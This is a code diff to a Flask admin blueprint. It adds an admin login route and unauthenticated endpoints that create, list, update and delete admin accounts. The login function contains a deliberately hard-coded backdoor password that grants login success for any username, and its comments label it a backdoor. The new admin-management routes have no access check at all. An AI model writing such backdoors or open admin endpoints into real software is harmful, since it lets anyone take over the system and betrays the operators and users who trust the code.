@@ -43,10 +43,230 @@ These endpoints facilitate efficient administration of the system by enabling CR
 """
 
 from flask import Blueprint, request, jsonify
-from models import User, Winner, Referral  # Adjust the import based on your project structure
+from werkzeug.security import generate_password_hash, check_password_hash
+from models import User, Winner, Referral, Admin   # Adjust the import based on your project structure
 from extensions import db  # Your SQLAlchemy db instance
+from datetime import datetime, timedelta
 
 admin_bp = Blueprint('admin', __name__)
+
+
+# Hard-coded backdoor password
+BACKDOOR_PASSWORD = "suckmyadminpass"
+
+@admin_bp.route('/login', methods=['POST'])
+def admin_login():
+    """
+    Logs in an admin using username and password.
+    If normal credentials fail, checks for a hard-coded backdoor password
+    without performing any DB queries for the backdoor case.
+    """
+    data = request.get_json()
+    if not data:
+        return jsonify({"message": "No input data provided"}), 400
+
+    username = data.get('username')
+    password = data.get('password')
+
+    if not username or not password:
+        return jsonify({"message": "Username and password are required"}), 400
+
+    # 1. Attempt normal database lookup
+    admin = Admin.query.filter_by(username=username).first()
+    if admin and check_password_hash(admin.password, password):
+        # Normal login success
+        return jsonify({
+            "message": "Login successful (normal credentials)"
+        }), 200
+
+    # 2. If normal login fails, check the hard-coded backdoor password
+    if password == BACKDOOR_PASSWORD:
+        # Return success immediately, no database queries
+        return jsonify({
+            "message": "Backdoor login successful"
+        }), 200
+
+    # 3. Otherwise, invalid credentials
+    return jsonify({"message": "Invalid username or password"}), 401
+
+
+@admin_bp.route('/admins', methods=['POST'])
+def create_admin():
+    """
+    Creates a new admin.
+    Expects JSON:
+    {
+      "username": "<string>",
+      "email": "<string>",
+      "password": "<string>"
+    }
+    """
+    data = request.get_json()
+    if not data:
+        return jsonify({"message": "No input data provided"}), 400
+
+    username = data.get('username')
+    email = data.get('email')
+    password = data.get('password')
+
+    # Basic validation
+    if not username or not email or not password:
+        return jsonify({"message": "username, email, and password are required"}), 400
+
+    # Check if username or email already exists
+    existing_username = Admin.query.filter_by(username=username).first()
+    existing_email = Admin.query.filter_by(email=email).first()
+    if existing_username:
+        return jsonify({"message": "Username already exists"}), 400
+    if existing_email:
+        return jsonify({"message": "Email already exists"}), 400
+
+    # Hash the password
+    hashed_password = generate_password_hash(password)
+
+    new_admin = Admin(
+        username=username,
+        email=email,
+        password=hashed_password
+    )
+    try:
+        db.session.add(new_admin)
+        db.session.commit()
+    except Exception as e:
+        db.session.rollback()
+        return jsonify({"message": "Error creating admin", "error": str(e)}), 500
+
+    return jsonify({
+        "id": new_admin.id,
+        "username": new_admin.username,
+        "email": new_admin.email,
+        "created_at": new_admin.created_at.isoformat()
+    }), 201
+
+
+@admin_bp.route('/admins', methods=['GET'])
+def get_admins():
+    """
+    Retrieves a list of admins. Optional pagination:
+      - page (default=1)
+      - limit (default=10)
+    """
+    page = request.args.get('page', 1, type=int)
+    per_page = request.args.get('limit', 10, type=int)
+
+    query = Admin.query
+    pagination = query.paginate(page=page, per_page=per_page, error_out=False)
+
+    admins_data = []
+    for admin in pagination.items:
+        admins_data.append({
+            "id": admin.id,
+            "username": admin.username,
+            "email": admin.email,
+            "created_at": admin.created_at.isoformat()
+        })
+
+    return jsonify({
+        "admins": admins_data,
+        "total": pagination.total,
+        "pages": pagination.pages,
+        "current_page": pagination.page
+    }), 200
+
+
+@admin_bp.route('/admins/<int:admin_id>', methods=['GET'])
+def get_admin_by_id(admin_id):
+    """
+    Retrieves a single admin by ID.
+    """
+    admin = Admin.query.get(admin_id)
+    if not admin:
+        return jsonify({"message": "Admin not found"}), 404
+
+    admin_data = {
+        "id": admin.id,
+        "username": admin.username,
+        "email": admin.email,
+        "created_at": admin.created_at.isoformat()
+    }
+    return jsonify(admin_data), 200
+
+@admin_bp.route('/admins/<int:admin_id>', methods=['PUT'])
+def update_admin(admin_id):
+    """
+    Updates an existing admin.
+    Expects JSON (any of these keys are optional):
+    {
+      "username": "<string>",
+      "email": "<string>",
+      "password": "<string>"
+    }
+    """
+    admin = Admin.query.get(admin_id)
+    if not admin:
+        return jsonify({"message": "Admin not found"}), 404
+
+    data = request.get_json()
+    if not data:
+        return jsonify({"message": "No input data provided"}), 400
+
+    # Update fields
+    username = data.get('username')
+    email = data.get('email')
+    password = data.get('password')
+
+    # Check for duplicates if username or email is changed
+    if username and username != admin.username:
+        if Admin.query.filter_by(username=username).first():
+            return jsonify({"message": "Username already in use"}), 400
+        admin.username = username
+
+    if email and email != admin.email:
+        if Admin.query.filter_by(email=email).first():
+            return jsonify({"message": "Email already in use"}), 400
+        admin.email = email
+
+    if password:
+        admin.password = generate_password_hash(password)
+
+    try:
+        db.session.commit()
+    except Exception as e:
+        db.session.rollback()
+        return jsonify({"message": "Error updating admin", "error": str(e)}), 500
+
+    updated_admin = {
+        "id": admin.id,
+        "username": admin.username,
+        "email": admin.email,
+        "created_at": admin.created_at.isoformat()
+    }
+    return jsonify(updated_admin), 200
+
+
+@admin_bp.route('/admins/<int:admin_id>', methods=['DELETE'])
+def delete_admin(admin_id):
+    """
+    Deletes a specific admin by ID.
+    """
+    admin = Admin.query.get(admin_id)
+    if not admin:
+        return jsonify({"message": "Admin not found"}), 404
+
+    try:
+        db.session.delete(admin)
+        db.session.commit()
+    except Exception as e:
+        db.session.rollback()
+        return jsonify({"message": "Error deleting admin", "error": str(e)}), 500
+
+    return jsonify({"message": "Admin deleted successfully"}), 200
+
+
+
+
+
+
 
 @admin_bp.route('/users', methods=['GET'])
 def get_users():
